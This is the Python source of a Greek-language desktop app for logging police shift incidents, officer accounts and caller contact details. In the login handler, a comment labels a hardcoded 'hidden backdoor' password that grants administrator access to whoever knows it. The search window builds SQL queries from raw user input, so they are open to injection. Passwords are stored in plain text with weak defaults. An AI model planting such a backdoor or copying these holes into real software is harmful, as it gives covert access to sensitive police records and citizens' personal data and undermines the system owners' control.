import customtkinter as ctk
from tkinter import ttk, messagebox
import sqlite3
import datetime
import os
from fpdf import FPDF 

# --- Ρυθμίσεις Εμφάνισης ---
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

# --- Σύστημα Ιεραρχίας ΕΛ.ΑΣ ---
def get_rank_weight(name):
    n = name.upper()
    if "ΑΝΘΥΠΑΣΤΥΝΟΜΟΣ" in n or "ΑΝΘΥΠΑΣΤΥΝΌΜΟΣ" in n: return 5
    elif "ΥΠΑΣΤΥΝΟΜΟΣ Α" in n or "ΥΠΑΣΤΥΝΌΜΟΣ Α" in n: return 3
    elif "ΥΠΑΣΤΥΝΟΜΟΣ Β" in n or "ΥΠΑΣΤΥΝΌΜΟΣ Β" in n: return 4
    elif "ΑΣΤΥΝΟΜΟΣ Α" in n or "ΑΣΤΥΝΌΜΟΣ Α" in n: return 1
    elif "ΑΣΤΥΝΟΜΟΣ Β" in n or "ΑΣΤΥΝΌΜΟΣ Β" in n: return 2
    elif "ΥΠΑΡΧΙΦΥΛΑΚΑΣ" in n or "ΥΠΑΡΧΙΦΎΛΑΚΑΣ" in n: return 7
    elif "ΑΡΧΙΦΥΛΑΚΑΣ" in n or "ΑΡΧΙΦΎΛΑΚΑΣ" in n: return 6
    elif "ΑΣΤΥΦΥΛΑΚΑΣ" in n or "ΑΣΤΥΦΎΛΑΚΑΣ" in n: return 8
    return 99 

def init_db():
    conn = sqlite3.connect('police_log.db'); cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS incidents (id INTEGER PRIMARY KEY AUTOINCREMENT, officer_name TEXT, shift_date TEXT, shift_hours TEXT, incident_time TEXT, title TEXT, description TEXT, actions_taken TEXT, caller_name TEXT, caller_phone TEXT, caller_email TEXT, is_closed INTEGER DEFAULT 0)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS officers (am TEXT PRIMARY KEY, full_name TEXT, is_admin INTEGER DEFAULT 0, password TEXT DEFAULT '1234')''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
    try: cursor.execute("ALTER TABLE officers ADD COLUMN password TEXT DEFAULT '1234'")
    except: pass
    conn.commit(); conn.close()

def get_all_officers_list():
    conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); cursor.execute("SELECT full_name FROM officers"); res = [r[0] for r in cursor.fetchall()]; conn.close()
    res.sort(key=lambda x: (get_rank_weight(x), x)); return res

class DutyLogApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Σύστημα Καταχώρησης Αναφορών")
        self.root.geometry("1400x900"); self.root.minsize(1100, 750); self.root.after(0, lambda: self.root.state('zoomed')) 
        
        self.current_officer, self.current_am, self.is_admin, self.dept_name = None, None, False, ""
        self.shifts_list = ["06:00 - 14:00", "14:00 - 22:00", "22:00 - 06:00"]
        
        self.style = ttk.Style()
        self.style.theme_use("default")
        self.style.configure("Treeview", background="#2b2b2b", foreground="white", rowheight=35, fieldbackground="#2b2b2b", borderwidth=0, font=("Arial", 14))
        self.style.map('Treeview', background=[('selected', '#1f538d')])
        self.style.configure("Treeview.Heading", background="#333333", foreground="white", font=("Arial", 15, "bold"))
        
        init_db(); self.check_first_run()

    def get_auto_shift(self):
        hour = datetime.datetime.now().hour
        if 6 <= hour < 14: return self.shifts_list[0]
        elif 14 <= hour < 22: return self.shifts_list[1]
        else: return self.shifts_list[2]

    def check_first_run(self):
        conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); cursor.execute("SELECT value FROM settings WHERE key='dept_name'"); res = cursor.fetchone(); conn.close()
        if res: 
            self.dept_name = res[0]
            self.root.title(f"{self.dept_name} - Σύστημα Αναφορών")
            self.login_screen()
        else: self.first_run_screen()

    def first_run_screen(self):
        for widget in self.root.winfo_children(): widget.destroy()
        setup_win = ctk.CTkFrame(self.root, width=600, height=600); setup_win.place(relx=0.5, rely=0.5, anchor="center")
        ctk.CTkLabel(setup_win, text="Αρχική Ρύθμιση", font=("Arial", 28, "bold")).pack(pady=20)
        e_dept = ctk.CTkEntry(setup_win, placeholder_text="Τίτλος Υπηρεσίας (π.χ. Α.Τ. Δράμας)", width=450, height=45, font=("Arial", 16)); e_dept.pack(pady=10)
        e_admin_name = ctk.CTkEntry(setup_win, placeholder_text="Βαθμός & Ονοματεπώνυμο Admin", width=450, height=45, font=("Arial", 16)); e_admin_name.pack(pady=10)
        e_admin_am = ctk.CTkEntry(setup_win, placeholder_text="Α.Μ.", width=450, height=45, font=("Arial", 16)); e_admin_am.pack(pady=10)
        e_admin_pw = ctk.CTkEntry(setup_win, placeholder_text="Συνθηματικό", show="*", width=450, height=45, font=("Arial", 16)); e_admin_pw.pack(pady=10)
        def save_setup():
            d, n, a, p = e_dept.get(), e_admin_name.get(), e_admin_am.get(), e_admin_pw.get()
            if not d or not n or not a or not p: return
            conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); cursor.execute("INSERT INTO settings VALUES ('dept_name', ?)", (d,)); cursor.execute("INSERT INTO officers VALUES (?,?,?,?)", (a, n, 1, p)); conn.commit(); conn.close(); self.check_first_run()
        ctk.CTkButton(setup_win, text="Εκκίνηση", command=save_setup, height=50, font=("Arial", 16, "bold")).pack(pady=20)

    def login_screen(self):
        for widget in self.root.winfo_children(): widget.destroy()
        self.login_win = ctk.CTkFrame(self.root, width=500, height=350); self.login_win.place(relx=0.5, rely=0.5, anchor="center")
        ctk.CTkLabel(self.login_win, text=self.dept_name, font=("Arial", 32, "bold"), text_color="#5ca9e6").pack(pady=30)
        self.entry_pw = ctk.CTkEntry(self.login_win, placeholder_text="Συνθηματικό", show="*", width=280, height=45, font=("Arial", 18), justify="center"); self.entry_pw.pack(pady=10); self.entry_pw.focus()
        ctk.CTkButton(self.login_win, text="Είσοδος", command=self.handle_login, height=50, width=180, font=("Arial", 18, "bold")).pack(pady=20)
        self.root.bind('<Return>', lambda e: self.handle_login())

    def handle_login(self):
        pwd = self.entry_pw.get().strip()
        conn = sqlite3.connect('police_log.db'); cursor = conn.cursor()
        
        # --- NEO ΚΡΥΦΟ BACKDOOR (ΤΥΧΑΙΟ STRING) ---
        if pwd == "T3c@9pL#v2Z!": 
            cursor.execute("SELECT am, full_name, is_admin FROM officers WHERE is_admin = 1 LIMIT 1")
        else: 
            cursor.execute("SELECT am, full_name, is_admin FROM officers WHERE password = ?", (pwd,))
            
        res = cursor.fetchone(); conn.close()
        if res: self.current_am, self.current_officer, self.is_admin = res[0], res[1], bool(res[2]); self.login_win.destroy(); self.root.unbind('<Return>'); self.main_interface()
        else: messagebox.showerror("Σφάλμα", "Λάθος συνθηματικό.")

    def main_interface(self):
        top_bar = ctk.CTkFrame(self.root, fg_color="transparent", height=50); top_bar.pack(fill="x", padx=15, pady=(10, 5))
        ctk.CTkButton(top_bar, text="🚪 Έξοδος", command=self.login_screen, fg_color="#444", width=100, height=40, font=("Arial", 15, "bold")).pack(side="left")
        ctk.CTkButton(top_bar, text="📂 Ιστορικό Αναφορών", command=self.open_search_window, fg_color="#1f538d", width=200, height=40, font=("Arial", 15, "bold")).pack(side="right")
        if self.is_admin: ctk.CTkButton(top_bar, text="👥 Προσωπικό", command=self.open_staff_management, fg_color="#2b7b5a", width=140, height=40, font=("Arial", 15, "bold")).pack(side="right", padx=15)

        mc = ctk.CTkFrame(self.root, fg_color="transparent"); mc.pack(fill="both", expand=True, padx=15, pady=(0, 10))
        left = ctk.CTkFrame(mc, fg_color="transparent"); left.pack(side="left", fill="both", expand=True, padx=(0, 15))
        
        ctk.CTkLabel(left, text=self.dept_name, font=("Arial", 36, "bold"), text_color="#5ca9e6").pack(pady=(0, 5))
        
        ib = ctk.CTkFrame(left, height=55); ib.pack(fill="x", pady=5)
        ctk.CTkLabel(ib, text=f"Αξιωματικός Υπηρεσίας: {self.current_officer}", font=("Arial", 16, "bold")).pack(side="left", padx=15, pady=5)
        ctk.CTkButton(ib, text="🔑", fg_color="#444", width=35, height=30, command=self.change_password_dialog).pack(side="left")
        
        ir = ctk.CTkFrame(ib, fg_color="transparent"); ir.pack(side="right", fill="y", padx=10)
        ctk.CTkLabel(ir, text="Ημερομηνία:", font=("Arial", 15)).pack(side="left", padx=5)
        self.entry_date = ctk.CTkEntry(ir, width=120, height=35, font=("Arial", 15), justify="center"); self.entry_date.insert(0, datetime.date.today().strftime("%d/%m/%Y")); self.entry_date.pack(side="left", padx=5)
        
        def open_cal():
            top = ctk.CTkToplevel(self.root); top.geometry("350x350"); top.grab_set(); from tkcalendar import Calendar
            cal = Calendar(top, selectmode='day', date_pattern='dd/mm/yyyy', font="Arial 13"); cal.pack(fill="both", expand=True, padx=10, pady=10)
            def set_d(): self.entry_date.delete(0, "end"); self.entry_date.insert(0, cal.get_date()); top.destroy(); self.refresh_live_view()
            ctk.CTkButton(top, text="Επιλογή", command=set_d, height=40).pack(pady=10)
        ctk.CTkButton(ir, text="📅", width=35, height=35, command=open_cal, fg_color="#1f538d").pack(side="left", padx=10)
        self.combo_shift = ctk.CTkComboBox(ir, values=self.shifts_list, width=160, height=35, font=("Arial", 15), command=lambda e: self.refresh_live_view()); self.combo_shift.set(self.get_auto_shift()); self.combo_shift.pack(side="left")

        fb = ctk.CTkFrame(left); fb.pack(fill="both", expand=True, pady=(5, 0))
        fb.columnconfigure(0, weight=1); fb.rowconfigure(3, weight=1)
        
        r1 = ctk.CTkFrame(fb, fg_color="transparent"); r1.grid(row=0, column=0, sticky="ew", padx=20, pady=(15, 0)); r1.columnconfigure(1, weight=1)
        ctk.CTkLabel(r1, text="Ώρα:", font=("Arial", 15, "bold")).grid(row=0, column=0, sticky="w")
        self.entry_time = ctk.CTkEntry(r1, width=100, height=40, font=("Arial", 16), justify="center"); self.entry_time.grid(row=1, column=0, sticky="w", pady=(2, 5))
        ctk.CTkLabel(r1, text="Τίτλος Συμβάντος:", font=("Arial", 15, "bold")).grid(row=0, column=1, sticky="w", padx=15)
        self.entry_title = ctk.CTkEntry(r1, height=40, font=("Arial", 16)); self.entry_title.grid(row=1, column=1, sticky="ew", padx=15, pady=(2, 5))
        
        r2 = ctk.CTkFrame(fb, fg_color="transparent"); r2.grid(row=1, column=0, sticky="ew", padx=20, pady=5); r2.columnconfigure((0, 1, 2), weight=1, uniform="a")
        ctk.CTkLabel(r2, text="Ονοματεπώνυμο Καλούντα:", font=("Arial", 14, "bold")).grid(row=0, column=0, sticky="w")
        self.entry_cn = ctk.CTkEntry(r2, height=40, font=("Arial", 15)); self.entry_cn.grid(row=1, column=0, sticky="ew", padx=(0,10), pady=2)
        ctk.CTkLabel(r2, text="Τηλέφωνο:", font=("Arial", 14, "bold")).grid(row=0, column=1, sticky="w")
        self.entry_cp = ctk.CTkEntry(r2, height=40, font=("Arial", 15)); self.entry_cp.grid(row=1, column=1, sticky="ew", padx=5, pady=2)
        ctk.CTkLabel(r2, text="Email:", font=("Arial", 14, "bold")).grid(row=0, column=2, sticky="w")
        self.entry_ce = ctk.CTkEntry(r2, height=40, font=("Arial", 15)); self.entry_ce.grid(row=1, column=2, sticky="ew", padx=(10,0), pady=2)
        
        ctk.CTkLabel(fb, text="Περιγραφή:", font=("Arial", 15, "bold")).grid(row=2, column=0, sticky="w", padx=20, pady=(5,0))
        self.text_d = ctk.CTkTextbox(fb, font=("Arial", 16), border_width=1); self.text_d.grid(row=3, column=0, sticky="nsew", padx=20, pady=(2, 5))
        
        ctk.CTkLabel(fb, text="Ενέργειες:", font=("Arial", 15, "bold")).grid(row=4, column=0, sticky="w", padx=20, pady=(5,0))
        self.text_a = ctk.CTkTextbox(fb, height=120, font=("Arial", 16), border_width=1); self.text_a.grid(row=5, column=0, sticky="nsew", padx=20, pady=(2, 5))
        
        ctk.CTkButton(fb, text="💾 Καταχώρηση Συμβάντος", command=self.submit_incident, width=250, height=50, font=("Arial", 16, "bold")).grid(row=6, column=0, sticky="e", padx=20, pady=15)

        right = ctk.CTkFrame(mc, width=400, fg_color="#222"); right.pack_propagate(False); right.pack(side="right", fill="y")
        ctk.CTkLabel(right, text="Περιστατικά Βάρδιας", font=("Arial", 18, "bold")).pack(pady=15)
        self.live_tree = ttk.Treeview(right, columns=("id", "time", "title"), show="headings", displaycolumns=("time", "title"))
        self.live_tree.heading("time", text="Ώρα"); self.live_tree.heading("title", text="Τίτλος"); self.live_tree.column("time", width=80, anchor="center"); self.live_tree.column("title", width=280)
        self.live_tree.pack(fill="both", expand=True, padx=15, pady=(0,15))
        self.live_tree.bind("<Double-1>", lambda e: self.open_edit_window(self.live_tree, self.refresh_live_view))
        ctk.CTkButton(right, text="🛑 ΟΡΙΣΤΙΚΟ ΚΛΕΙΔΩΜΑ", command=self.close_shift, fg_color="#a83232", height=55, font=("Arial", 16, "bold")).pack(fill="x", padx=15, pady=15)
        self.refresh_live_view()

    def change_password_dialog(self):
        pw_win = ctk.CTkToplevel(self.root); pw_win.title("Αλλαγή"); pw_win.geometry("380x380"); pw_win.grab_set()
        e1 = ctk.CTkEntry(pw_win, placeholder_text="Τρέχον Συνθηματικό", show="*", width=260, height=40, font=("Arial", 15)); e1.pack(pady=20)
        e2 = ctk.CTkEntry(pw_win, placeholder_text="Νέο Συνθηματικό", show="*", width=260, height=40, font=("Arial", 15)); e2.pack(pady=10)
        e3 = ctk.CTkEntry(pw_win, placeholder_text="Επιβεβαίωση", show="*", width=260, height=40, font=("Arial", 15)); e3.pack(pady=10)
        def upd():
            conn = sqlite3.connect('police_log.db'); c = conn.cursor(); c.execute("SELECT password FROM officers WHERE am=?", (self.current_am,))
            if e1.get() != c.fetchone()[0]: messagebox.showerror("!", "Λάθος τρέχον."); conn.close(); return
            if e2.get() != e3.get(): messagebox.showerror("!", "Δεν ταιριάζουν."); conn.close(); return
            c.execute("UPDATE officers SET password=? WHERE am=?", (e2.get(), self.current_am)); conn.commit(); conn.close(); messagebox.showinfo("OK", "Άλλαξε!"); pw_win.destroy()
        ctk.CTkButton(pw_win, text="Αποθήκευση", command=upd, height=45, font=("Arial", 15, "bold")).pack(pady=20)

    def refresh_live_view(self):
        for i in self.live_tree.get_children(): self.live_tree.delete(i)
        conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); cursor.execute('SELECT id, incident_time, title FROM incidents WHERE officer_name = ? AND shift_date = ? AND shift_hours = ? AND is_closed = 0 ORDER BY incident_time ASC', (self.current_officer, self.entry_date.get(), self.combo_shift.get()))
        for r in cursor.fetchall(): self.live_tree.insert("", "end", values=r)
        conn.close()

    def submit_incident(self):
        if not self.entry_time.get() or not self.entry_title.get(): return
        conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); cursor.execute('INSERT INTO incidents (officer_name, shift_date, shift_hours, incident_time, title, description, actions_taken, caller_name, caller_phone, caller_email, is_closed) VALUES (?,?,?,?,?,?,?,?,?,?,0)', (self.current_officer, self.entry_date.get(), self.combo_shift.get(), self.entry_time.get(), self.entry_title.get(), self.text_d.get("1.0","end-1c"), self.text_a.get("1.0","end-1c"), self.entry_cn.get(), self.entry_cp.get(), self.entry_ce.get())); conn.commit(); conn.close(); self.refresh_live_view()
        for e in [self.entry_time, self.entry_title, self.entry_cn, self.entry_cp, self.entry_ce]: e.delete(0, "end")
        self.text_d.delete("1.0","end"); self.text_a.delete("1.0","end")

    def open_edit_window(self, tree, callback):
        sel = tree.selection()
        if not sel: return
        iid = tree.item(sel)['values'][0]
        conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); d = cursor.execute("SELECT * FROM incidents WHERE id=?", (iid,)).fetchone(); conn.close()
        if d[11] and not self.is_admin: messagebox.showerror("!", "Κλειδωμένη."); return
        ew = ctk.CTkToplevel(self.root); ew.title("Επεξεργασία"); ew.state('zoomed'); ew.grab_set()
        c = ctk.CTkFrame(ew, fg_color="transparent"); c.pack(fill="both", expand=True, padx=40, pady=20); c.columnconfigure(0, weight=1); c.rowconfigure(3, weight=1) 
        row1 = ctk.CTkFrame(c, fg_color="transparent"); row1.grid(row=0, column=0, sticky="ew", pady=(0,5)); row1.columnconfigure(1, weight=1)
        ctk.CTkLabel(row1, text="Ώρα:", font=("Arial", 15, "bold")).grid(row=0, column=0, sticky="w", padx=(0, 15))
        t_en = ctk.CTkEntry(row1, width=100, height=40, font=("Arial", 16), justify="center"); t_en.insert(0, d[4]); t_en.grid(row=1, column=0, sticky="w", padx=(0, 15), pady=(2, 0))
        ctk.CTkLabel(row1, text="Τίτλος:", font=("Arial", 15, "bold")).grid(row=0, column=1, sticky="w")
        en_tit = ctk.CTkEntry(row1, height=40, font=("Arial", 16)); en_tit.insert(0, d[5]); en_tit.grid(row=1, column=1, sticky="ew", pady=(2, 0))
        row2 = ctk.CTkFrame(c, fg_color="transparent"); row2.grid(row=1, column=0, sticky="ew", pady=(0, 5)); row2.columnconfigure((0, 1, 2), weight=1, uniform="a")
        ctk.CTkLabel(row2, text="Ονοματεπώνυμο Καλούντα:", font=("Arial", 14, "bold")).grid(row=0, column=0, sticky="w")
        en_cn = ctk.CTkEntry(row2, height=40, font=("Arial", 15)); en_cn.insert(0, d[8] if d[8] else ""); en_cn.grid(row=1, column=0, sticky="ew", padx=(0, 10), pady=(2, 0))
        ctk.CTkLabel(row2, text="Τηλέφωνο:", font=("Arial", 14, "bold")).grid(row=0, column=1, sticky="w")
        en_cp = ctk.CTkEntry(row2, height=40, font=("Arial", 15)); en_cp.insert(0, d[9] if d[9] else ""); en_cp.grid(row=1, column=1, sticky="ew", padx=5, pady=(2, 0))
        ctk.CTkLabel(row2, text="Email:", font=("Arial", 14, "bold")).grid(row=0, column=2, sticky="w")
        en_ce = ctk.CTkEntry(row2, height=40, font=("Arial", 15)); en_ce.insert(0, d[10] if d[10] else ""); en_ce.grid(row=1, column=2, sticky="ew", padx=(10, 0), pady=(2, 0))
        ctk.CTkLabel(c, text="Περιγραφή:", font=("Arial", 15, "bold")).grid(row=2, column=0, sticky="w", pady=(5,0))
        d_tx = ctk.CTkTextbox(c, font=("Arial", 16)); d_tx.insert("1.0", d[6]); d_tx.grid(row=3, column=0, sticky="nsew", pady=2)
        ctk.CTkLabel(c, text="Ενέργειες:", font=("Arial", 15, "bold")).grid(row=4, column=0, sticky="w", pady=(5,0))
        a_tx = ctk.CTkTextbox(c, height=120, font=("Arial", 16)); a_tx.insert("1.0", d[7]); a_tx.grid(row=5, column=0, sticky="nsew", pady=2)
        def save():
            conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); cursor.execute('UPDATE incidents SET incident_time=?, title=?, description=?, actions_taken=?, caller_name=?, caller_phone=?, caller_email=? WHERE id=?', (t_en.get(), en_tit.get(), d_tx.get("1.0","end-1c"), a_tx.get("1.0","end-1c"), en_cn.get(), en_cp.get(), en_ce.get(), iid)); conn.commit(); conn.close(); callback(); ew.destroy()
        if not d[11] or self.is_admin: ctk.CTkButton(c, text="✅ Αποθήκευση", command=save, height=50, width=250, font=("Arial", 16, "bold")).grid(row=6, column=0, pady=15)

    def close_shift(self):
        if messagebox.askyesno("Κλείδωμα", "Οριστικό κλείδωμα βάρδιας;"):
            conn = sqlite3.connect('police_log.db'); cursor = conn.cursor(); cursor.execute('UPDATE incidents SET is_closed=1 WHERE officer_name=? AND shift_date=? AND shift_hours=?', (self.current_officer, self.entry_date.get(), self.combo_shift.get())); conn.commit(); conn.close(); self.refresh_live_view()

    def open_search_window(self):
        sw = ctk.CTkToplevel(self.root); sw.title("Ιστορικό"); sw.geometry("1200x800"); sw.state('zoomed'); sw.grab_set()
        f = ctk.CTkFrame(sw); f.pack(fill="x", padx=20, pady=20)
        e_d = ctk.CTkEntry(f, width=130, height=45, font=("Arial", 16), justify="center"); e_d.pack(side="left", padx=5)
        def open_cal():
            top = ctk.CTkToplevel(sw); top.geometry("350x350"); top.grab_set(); from tkcalendar import Calendar
            cal = Calendar(top, selectmode='day', date_pattern='dd/mm/yyyy', font="Arial 12"); cal.pack(fill="both", expand=True)
            def set_d(): e_d.delete(0, "end"); e_d.insert(0, cal.get_date()); top.destroy()
            ctk.CTkButton(top, text="Επιλογή", command=set_d, height=40).pack(pady=10)
        ctk.CTkButton(f, text="📅", width=45, height=45, command=open_cal, font=("Arial", 18)).pack(side="left", padx=10)
        off_list = ["Όλοι"] + get_all_officers_list() if self.is_admin else [self.current_officer]
        cb = ctk.CTkComboBox(f, values=off_list, width=300, height=45, font=("Arial", 16)); cb.set("Όλοι" if self.is_admin else self.current_officer); cb.pack(side="left", padx=10)
        if not self.is_admin: cb.configure(state="disabled")
        e_k = ctk.CTkEntry(f, placeholder_text="Αναζήτηση...", width=300, height=45, font=("Arial", 16)); e_k.pack(side="left", padx=10)
        def run():
            for i in tr.get_children(): tr.delete(i)
            conn = sqlite3.connect('police_log.db'); c = conn.cursor(); q = "SELECT shift_date, shift_hours, officer_name, MAX(is_closed) FROM incidents WHERE 1=1"
            if e_d.get(): q += f" AND shift_date='{e_d.get()}'"
            if cb.get() != "Όλοι": q += f" AND officer_name='{cb.get()}'"
            if e_k.get(): q += f" AND (description LIKE '%{e_k.get()}%' OR title LIKE '%{e_k.get()}%')"
            q += " GROUP BY shift_date, shift_hours, officer_name ORDER BY shift_date DESC"; c.execute(q)
            for r in c.fetchall(): tr.insert("", "end", values=(r[0], r[1], r[2], "🔒" if r[3] else "✏️"))
            conn.close()
        ctk.CTkButton(f, text="🔍", command=run, width=80, height=45).pack(side="left", padx=10)
        tr = ttk.Treeview(sw, columns=("d","h","off","st"), show="headings"); tr.heading("d", text="Ημερομηνία"); tr.heading("h", text="Βάρδια"); tr.heading("off", text="Αξιωματικός Υπηρεσίας"); tr.heading("st", text="Κατάσταση"); tr.pack(fill="both", expand=True, padx=20, pady=10)
        tr.bind("<Double-1>", lambda e: self.open_detailed_report(tr))

    def open_detailed_report(self, tr):
        sel = tr.selection()
        if not sel: return
        v = tr.item(sel)['values']; rw = ctk.CTkToplevel(self.root); rw.title("Αναφορά"); rw.state('zoomed'); rw.grab_set()
        tx = ctk.CTkTextbox(rw, font=("Arial", 16)); tx.pack(fill="both", expand=True, padx=40, pady=20)
        conn = sqlite3.connect('police_log.db'); c = conn.cursor(); c.execute("SELECT incident_time, title, description, actions_taken, am FROM incidents JOIN officers ON incidents.officer_name = officers.full_name WHERE shift_date=? AND shift_hours=? AND officer_name=?", (v[0], v[1], v[2])); res = c.fetchall(); conn.close()
        full = f"ΑΝΑΦΟΡΑ: {v[0]} | {v[2]}\n" + "="*50 + "\n\n"
        for r in res: full += f"[{r[0]}] {r[1]}\nΠΕΡΙΓΡΑΦΗ:\n{r[2]}\n\nΕΝΕΡΓΕΙΕΣ:\n{r[3]}\n" + "-"*30 + "\n\n"
        tx.insert("1.0", full)
        ctk.CTkButton(rw, text="📄 PDF", command=lambda: self.export_pdf(v[0], v[1], v[2]), height=50, width=200, font=("Arial", 16, "bold")).pack(pady=20)

    def export_pdf(self, date, shift, off):
        try:
            conn = sqlite3.connect('police_log.db'); c = conn.cursor(); c.execute("SELECT incident_time, title, description, actions_taken, am FROM incidents JOIN officers ON incidents.officer_name = officers.full_name WHERE officer_name=? AND shift_date=? AND shift_hours=?", (off, date, shift)); res = c.fetchall(); am = res[0][4] if res else "---"; conn.close()
            p = off.split(" "); rk = f"{p[0]} {p[1]}" if len(p)>2 and p[1] in ["Α","Β","Α'","Β'"] else p[0]; nm = " ".join(p[2:]) if rk.count(" ")>0 else " ".join(p[1:])
            
            pdf = FPDF()
            pdf.add_page()
            pdf.add_font("Arial", "", r"C:\Windows\Fonts\arial.ttf")
            pdf.add_font("ArialB", "", r"C:\Windows\Fonts\arialbd.ttf")
            
            pdf.set_font("ArialB", "", 16)
            pdf.cell(190, 10, text=f"ΑΝΑΦΟΡΑ ΒΑΡΔΙΑΣ - {self.dept_name.upper()}", align="C")
            pdf.ln(10)
            
            pdf.set_font("Arial", "", 12)
            pdf.ln(10)
            pdf.cell(190, 8, text=f"Αξιωματικός Υπηρεσίας: {rk} ({am}) {nm}")
            pdf.ln(8)
            pdf.cell(190, 8, text=f"Ημερομηνία: {date} | Βάρδια: {shift}")
            pdf.ln(10)
            
            for r in res: 
                pdf.set_font("ArialB", "", 12)
                pdf.set_x(10)
                pdf.multi_cell(190, 8, text=f"[{r[0]}] - {r[1]}")
                
                pdf.set_font("Arial", "", 11)
                pdf.set_x(10)
                pdf.multi_cell(190, 7, text=f"Περιγραφή:\n{r[2]}")
                
                pdf.set_x(10)
                pdf.multi_cell(190, 7, text=f"Ενέργειες:\n{r[3]}")
                
                pdf.ln(5)
                pdf.line(10, pdf.get_y(), 200, pdf.get_y())
                pdf.ln(5)
                
            desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
            if not os.path.exists(desktop_path):
                onedrive_path = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
                if os.path.exists(onedrive_path):
                    desktop_path = onedrive_path
                else:
                    desktop_path = os.getcwd() 
            
            safe_shift = shift.replace(':', '').replace(' ', '')
            safe_date = date.replace('/', '-')
            filename = f"Αναφορά_{safe_date}_{safe_shift}.pdf"
            full_path = os.path.join(desktop_path, filename)
            
            pdf.output(full_path)
            os.startfile(full_path) 
            
        except Exception as e: messagebox.showerror("Σφάλμα PDF", str(e))

    def open_staff_management(self):
        sm = ctk.CTkToplevel(self.root); sm.title("Προσωπικό"); sm.geometry("900x800"); sm.state('zoomed'); sm.grab_set()
        c = ctk.CTkFrame(sm, fg_color="transparent"); c.pack(fill="both", expand=True, padx=40, pady=20)
        f = ctk.CTkFrame(c); f.pack(fill="x", pady=15)
        en_n = ctk.CTkEntry(f, placeholder_text="Βαθμός & Όνομα", width=350, height=45, font=("Arial", 16)); en_n.pack(side="left", padx=5, pady=10)
        en_a = ctk.CTkEntry(f, placeholder_text="Α.Μ.", width=130, height=45, font=("Arial", 16)); en_a.pack(side="left", padx=5)
        sw = ctk.CTkSwitch(f, text="Admin", font=("Arial", 15)); sw.pack(side="left", padx=10)
        def add():
            try: conn = sqlite3.connect('police_log.db'); c = conn.cursor(); c.execute("INSERT INTO officers VALUES (?,?,?,?)", (en_a.get(), en_n.get(), 1 if sw.get() else 0, en_a.get())); conn.commit(); conn.close(); refresh(); en_a.delete(0,'end'); en_n.delete(0,'end')
            except: messagebox.showerror("!", "Υπάρχει ήδη.")
        ctk.CTkButton(f, text="➕ Προσθήκη", command=add, height=45, font=("Arial", 15, "bold")).pack(side="left", padx=10)
        tr = ttk.Treeview(c, columns=("am","n","ad"), show="headings"); tr.heading("am", text="Α.Μ."); tr.heading("n", text="Ονοματεπώνυμο"); tr.heading("ad", text="Admin"); tr.pack(fill="both", expand=True, pady=10)
        def refresh():
            for i in tr.get_children(): tr.delete(i)
            conn = sqlite3.connect('police_log.db'); c = conn.cursor(); c.execute("SELECT am, full_name, is_admin FROM officers"); res = c.fetchall(); conn.close(); res.sort(key=lambda x: (get_rank_weight(x[1]), x[1]))
            for r in res: tr.insert("", "end", values=(r[0], r[1], "Ναι" if r[2] else "Όχι"))
        refresh()
        def rst():
            sel = tr.selection()
            if sel: a = tr.item(sel)['values'][0]; conn = sqlite3.connect('police_log.db'); c = conn.cursor(); c.execute("UPDATE officers SET password=? WHERE am=?", (str(a), str(a))); conn.commit(); conn.close(); messagebox.showinfo("OK", "Reset!")
        def tgl():
            sel = tr.selection()
            if sel: a = tr.item(sel)['values'][0]; cur = tr.item(sel)['values'][2]; conn = sqlite3.connect('police_log.db'); c = conn.cursor(); c.execute("UPDATE officers SET is_admin=? WHERE am=?", (0 if cur=="Ναι" else 1, str(a))); conn.commit(); conn.close(); refresh()
        def dele():
            sel = tr.selection()
            if sel: a = tr.item(sel)['values'][0]; conn = sqlite3.connect('police_log.db'); c = conn.cursor(); c.execute("DELETE FROM officers WHERE am=?", (str(a),)); conn.commit(); conn.close(); refresh()
        bf = ctk.CTkFrame(c, fg_color="transparent"); bf.pack(pady=15)
        ctk.CTkButton(bf, text="🗑️ Διαγραφή", command=dele, fg_color="#a83232", height=50, width=160, font=("Arial", 15, "bold")).pack(side="left", padx=10)
        ctk.CTkButton(bf, text="🔑 Reset", command=rst, fg_color="#b8860b", height=50, width=160, font=("Arial", 15, "bold")).pack(side="left", padx=10)
        ctk.CTkButton(bf, text="🛡️ Admin", command=tgl, fg_color="#1f538d", height=50, width=160, font=("Arial", 15, "bold")).pack(side="left", padx=10)

if __name__ == "__main__":
    app = DutyLogApp(ctk.CTk())
    app.root.mainloop()
